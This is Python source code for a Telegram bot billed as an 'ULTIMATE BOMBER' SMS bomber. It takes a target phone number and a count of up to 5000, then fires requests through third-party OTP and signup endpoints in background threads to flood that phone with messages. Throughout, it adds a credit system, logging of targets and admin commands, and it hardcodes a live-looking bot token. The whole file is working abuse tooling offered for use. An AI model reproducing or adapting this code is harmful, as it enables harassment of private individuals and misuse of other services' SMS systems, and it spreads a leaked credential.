#!/usr/bin/env python
# ULTIMATE BOMBER BOT - SIMPLE VERSION
# (c) @lordzenox

import os, sys, json, time, random, threading, logging, requests
from datetime import datetime
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters

# ========== CONFIG ==========
BOT_TOKEN = "8996694548:AAF0ZA36jaUDkbkrKpcbqjxuppiX3YyyseY"
ADMIN_ID = 8112149031
OWNER = "@lordzenox"
CHANNEL1 = "@zenoxtool"
CHANNEL2 = "@Dev_Null_X_NODE_JS"
BOT_NAME = "ULTIMATE BOMBER"
BOT_VERSION = "v1.0"
BOMB_COST = 2
FREE_COINS = 5

# ========== DISABLE LOGGING ==========
logging.basicConfig(level=logging.ERROR)
sys.stderr = open(os.devnull, 'w')

# ========== GLOBALS ==========
stop_bombing = {}

# ========== LOAD SERVICES ==========
def load_services():
    try:
        with open('services.json', 'r') as f:
            data = json.load(f)
            return data.get('services', [])
    except:
        return []

SERVICES = load_services()
print(f"✅ Loaded {len(SERVICES)} services")

# ========== DATABASE ==========
import sqlite3, random, string

DB_NAME = 'zenox_bomber.db'

def init_db():
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY, username TEXT, first_name TEXT,
        coins INTEGER DEFAULT 0, total_bombs INTEGER DEFAULT 0,
        total_sms INTEGER DEFAULT 0, referral_code TEXT UNIQUE,
        join_date TEXT, is_banned INTEGER DEFAULT 0
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS bomb_logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER,
        target TEXT, sms_count INTEGER, success INTEGER,
        failed INTEGER, date TEXT
    )''')
    conn.commit()
    conn.close()

init_db()

def get_user(user_id):
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
    user = c.fetchone()
    conn.close()
    return user

def create_user(user_id, username, first_name):
    if get_user(user_id):
        return False
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    ref_code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
    c.execute('''INSERT INTO users (user_id, username, first_name, coins, referral_code, join_date)
        VALUES (?, ?, ?, ?, ?, ?)''',
        (user_id, username or first_name, first_name, FREE_COINS, ref_code, datetime.now().isoformat()))
    conn.commit()
    conn.close()
    return True

def get_balance(user_id):
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("SELECT coins FROM users WHERE user_id = ?", (user_id,))
    result = c.fetchone()
    conn.close()
    return result[0] if result else 0

def deduct_coins(user_id, amount):
    if amount <= 0: return False
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("SELECT coins FROM users WHERE user_id = ?", (user_id,))
    user = c.fetchone()
    if not user or user[0] < amount:
        conn.close()
        return False
    c.execute("UPDATE users SET coins = coins - ? WHERE user_id = ?", (amount, user_id))
    conn.commit()
    conn.close()
    return True

def add_bomb_stats(user_id, target, sms_count, success, failed):
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("UPDATE users SET total_bombs = total_bombs + 1, total_sms = total_sms + ? WHERE user_id = ?",
              (sms_count, user_id))
    c.execute('''INSERT INTO bomb_logs (user_id, target, sms_count, success, failed, date)
        VALUES (?, ?, ?, ?, ?, ?)''',
        (user_id, target, sms_count, success, failed, datetime.now().isoformat()))
    conn.commit()
    conn.close()

def is_banned(user_id):
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("SELECT is_banned FROM users WHERE user_id = ?", (user_id,))
    result = c.fetchone()
    conn.close()
    return result and result[0] == 1

# ========== BOMBING ENGINE ==========
def format_phone(phone, fmt):
    p = str(phone).strip()
    if fmt == "with_plus91": return f"+91{p}"
    if fmt == "91-": return f"91-{p}"
    return p

def send_request(svc, phone):
    method = svc.get('method', 'POST').upper()
    url = svc.get('url', '').replace("{phone}", format_phone(phone, svc.get('phone_format', 'raw')))
    headers = svc.get('headers', {}).copy()
    data = svc.get('data')
    if data:
        if '_raw' in data:
            raw = data['_raw'].replace("{phone}", format_phone(phone, svc.get('phone_format', 'raw')))
            try:
                import ast
                data = ast.literal_eval(raw)
            except:
                pass
        else:
            data = json.loads(json.dumps(data).replace("{phone}", format_phone(phone, svc.get('phone_format', 'raw'))))
    try:
        if method == 'GET':
            r = requests.get(url, headers=headers, timeout=2)
        elif method == 'POST':
            r = requests.post(url, headers=headers, json=data, timeout=2)
        elif method == 'PUT':
            r = requests.put(url, headers=headers, json=data, timeout=2)
        else:
            return False
        return r.status_code < 500
    except:
        return False

def bomb_thread(phone, total, user_id, target_msg):
    global stop_bombing
    stop_bombing[user_id] = False
    services = SERVICES.copy()
    random.shuffle(services)
    sent = 0
    success = 0
    failed = 0

    while sent < total and not stop_bombing.get(user_id, False):
        for svc in services:
            if stop_bombing.get(user_id, False) or sent >= total:
                break
            try:
                ok = send_request(svc, phone)
                if ok:
                    success += 1
                else:
                    failed += 1
                sent += 1
            except:
                failed += 1
                sent += 1
            time.sleep(0.1)
            if sent % 10 == 0 or sent >= total:
                try:
                    progress = int((sent / total) * 100) if total > 0 else 0
                    msg = f"""🔄 **SENDING SMS...**

📱 Target: +91{phone}
📊 {progress}% | SENT: {sent} | ✅ {success} | ❌ {failed}

🛑 Type /stop to stop"""
                    target_msg.edit_text(msg, parse_mode="Markdown")
                except:
                    pass

    add_bomb_stats(user_id, phone, sent, success, failed)
    final_msg = f"""✅ **COMPLETE!**

📱 Target: +91{phone}
📊 Sent: {sent} | ✅ {success} | ❌ {failed}

📢 {CHANNEL1} | {CHANNEL2}"""
    try:
        target_msg.edit_text(final_msg, parse_mode="Markdown")
    except:
        pass

# ========== TELEGRAM BOT ==========
app = Application.builder().token(BOT_TOKEN).build()

# ========== START ==========
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user = update.effective_user

    if is_banned(user_id):
        await update.message.reply_text("🚫 You are banned.")
        return

    if not get_user(user_id):
        create_user(user_id, user.username or user.first_name, user.first_name)

    coins = get_balance(user_id)

    msg = f"""🔥 **{BOT_NAME}**
💀 **SIMPLE SMS BOMBER**

👑 **Owner:** {OWNER}
📡 **APIs:** {len(SERVICES)}
💰 **Credits:** {coins}

📢 **Channels:** {CHANNEL1} | {CHANNEL2}

**HOW TO USE:**
/bomb <number> <count>
Example: `/bomb 9876543210 100`

/stop - Stop bombing
/balance - Check credits
/admin - Admin panel (admin only)"""

    await update.message.reply_text(msg, parse_mode="Markdown")

# ========== BOMB COMMAND ==========
async def bomb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user = update.effective_user

    if is_banned(user_id):
        await update.message.reply_text("🚫 You are banned.")
        return

    if not get_user(user_id):
        create_user(user_id, user.username or user.first_name, user.first_name)

    if len(context.args) != 2:
        await update.message.reply_text(
            "❌ **Usage:** `/bomb <number> <count>`\n\n"
            "Example: `/bomb 9876543210 100`\n"
            "Count = number of SMS to send",
            parse_mode="Markdown"
        )
        return

    phone = context.args[0]
    if len(phone) != 10 or not phone.isdigit():
        await update.message.reply_text("❌ Invalid number! Enter 10 digits.")
        return

    try:
        count = int(context.args[1])
        if count < 1 or count > 5000:
            await update.message.reply_text("❌ Count must be 1-5000.")
            return
    except ValueError:
        await update.message.reply_text("❌ Invalid count! Enter a number.")
        return

    coins = get_balance(user_id)
    if coins < BOMB_COST:
        await update.message.reply_text(f"❌ **Insufficient Credits!**\n💰 Balance: {coins}\n💸 Cost: {BOMB_COST}", parse_mode="Markdown")
        return

    if not deduct_coins(user_id, BOMB_COST):
        await update.message.reply_text("❌ Failed to deduct credits.")
        return

    stop_bombing[user_id] = False

    msg = f"""🔄 **BOMBING STARTED!**

📱 Target: +91{phone}
📊 Count: {count}
💰 Credits Left: {get_balance(user_id)}

🛑 Type /stop to stop."""
    msg_sent = await update.message.reply_text(msg, parse_mode="Markdown")

    def run_bomb():
        bomb_thread(phone, count, user_id, msg_sent)

    threading.Thread(target=run_bomb, daemon=True).start()

# ========== STOP ==========
async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    stop_bombing[user_id] = True
    await update.message.reply_text("🛑 **Stopped!**", parse_mode="Markdown")

# ========== BALANCE ==========
async def balance(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    coins = get_balance(user_id)
    await update.message.reply_text(f"💰 **Balance:** {coins} credits", parse_mode="Markdown")

# ========== HELP ==========
async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = """📌 **Commands:**

/bomb <number> <count> - Start bombing
/stop - Stop bombing
/balance - Check credits
/start - Main menu
/admin - Admin panel (admin only)

Example: /bomb 9876543210 100"""
    await update.message.reply_text(msg, parse_mode="Markdown")

# ============================================================
# ADMIN PANEL
# ============================================================
async def admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if user_id != ADMIN_ID:
        await update.message.reply_text("❌ Unauthorized! Only admin can access.")
        return
    
    msg = """🔐 **Admin Panel**

/addcoins <user_id> <amount>
/broadcast <message>
/statsall - Full stats
/ban <user_id>
/unban <user_id>"""
    
    await update.message.reply_text(msg, parse_mode="Markdown")

async def addcoins(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != ADMIN_ID:
        await update.message.reply_text("❌ Unauthorized!")
        return
    if len(context.args) != 2:
        await update.message.reply_text("❌ Usage: `/addcoins <user_id> <amount>`", parse_mode="Markdown")
        return
    try:
        target_id = int(context.args[0])
        amount = int(context.args[1])
    except ValueError:
        await update.message.reply_text("❌ Invalid input!")
        return
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("UPDATE users SET coins = coins + ? WHERE user_id = ?", (amount, target_id))
    conn.commit()
    conn.close()
    await update.message.reply_text(f"✅ Added **{amount}** credits to `{target_id}`", parse_mode="Markdown")

async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != ADMIN_ID:
        await update.message.reply_text("❌ Unauthorized!")
        return
    if not context.args:
        await update.message.reply_text("❌ Usage: `/broadcast <message>`", parse_mode="Markdown")
        return
    message = " ".join(context.args)
    users = get_all_users()
    sent = 0
    for uid, username, coins, bombs, sms in users:
        try:
            await context.bot.send_message(uid, f"📢 **Announcement**\n\n{message}", parse_mode="Markdown")
            sent += 1
            time.sleep(0.05)
        except:
            pass
    await update.message.reply_text(f"✅ Broadcast sent to {sent} users")

async def statsall(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != ADMIN_ID:
        await update.message.reply_text("❌ Unauthorized!")
        return
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM users")
    total_users = c.fetchone()[0]
    c.execute("SELECT SUM(coins) FROM users")
    total_coins = c.fetchone()[0] or 0
    c.execute("SELECT SUM(total_bombs) FROM users")
    total_bombs = c.fetchone()[0] or 0
    c.execute("SELECT SUM(total_sms) FROM users")
    total_sms = c.fetchone()[0] or 0
    conn.close()
    msg = f"""📊 **Full Statistics**

👤 Users: {total_users}
💰 Coins: {total_coins}
💣 Bombs: {total_bombs}
📱 SMS: {total_sms}
📡 APIs: {len(SERVICES)}
👑 Owner: {OWNER}"""
    await update.message.reply_text(msg, parse_mode="Markdown")

async def ban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != ADMIN_ID:
        await update.message.reply_text("❌ Unauthorized!")
        return
    if len(context.args) != 1:
        await update.message.reply_text("❌ Usage: `/ban <user_id>`", parse_mode="Markdown")
        return
    try:
        target_id = int(context.args[0])
    except ValueError:
        await update.message.reply_text("❌ Invalid user_id!")
        return
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("UPDATE users SET is_banned = 1 WHERE user_id = ?", (target_id,))
    conn.commit()
    conn.close()
    await update.message.reply_text(f"🚫 User `{target_id}` banned.", parse_mode="Markdown")

async def unban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != ADMIN_ID:
        await update.message.reply_text("❌ Unauthorized!")
        return
    if len(context.args) != 1:
        await update.message.reply_text("❌ Usage: `/unban <user_id>`", parse_mode="Markdown")
        return
    try:
        target_id = int(context.args[0])
    except ValueError:
        await update.message.reply_text("❌ Invalid user_id!")
        return
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("UPDATE users SET is_banned = 0 WHERE user_id = ?", (target_id,))
    conn.commit()
    conn.close()
    await update.message.reply_text(f"✅ User `{target_id}` unbanned.", parse_mode="Markdown")

# ========== GET ALL USERS ==========
def get_all_users(limit=100):
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("SELECT user_id, username, coins, total_bombs, total_sms FROM users ORDER BY coins DESC LIMIT ?", (limit,))
    users = c.fetchall()
    conn.close()
    return users

# ========== MAIN ==========
if __name__ == "__main__":
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("bomb", bomb))
    app.add_handler(CommandHandler("stop", stop))
    app.add_handler(CommandHandler("balance", balance))
    app.add_handler(CommandHandler("help", help_cmd))
    app.add_handler(CommandHandler("admin", admin))
    app.add_handler(CommandHandler("addcoins", addcoins))
    app.add_handler(CommandHandler("broadcast", broadcast))
    app.add_handler(CommandHandler("statsall", statsall))
    app.add_handler(CommandHandler("ban", ban))
    app.add_handler(CommandHandler("unban", unban))

    print("=" * 50)
    print(f"🤖 {BOT_NAME} ({BOT_VERSION})")
    print(f"📊 Loaded {len(SERVICES)} APIs")
    print(f"👑 Owner: {OWNER}")
    print(f"📢 Channels: {CHANNEL1} | {CHANNEL2}")
    print("=" * 50)
    app.run_polling(drop_pending_updates=True)
